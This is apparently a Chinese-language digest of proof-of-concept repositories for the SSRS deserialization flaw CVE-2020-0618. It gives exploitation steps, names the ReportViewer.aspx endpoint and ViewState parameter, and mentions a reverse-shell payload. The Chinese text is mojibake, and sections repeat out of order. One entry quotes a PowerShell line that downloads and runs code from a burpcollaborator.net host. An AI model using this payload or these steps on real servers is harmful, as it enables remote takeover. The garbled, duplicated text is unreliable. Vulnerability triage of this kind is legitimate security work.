æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

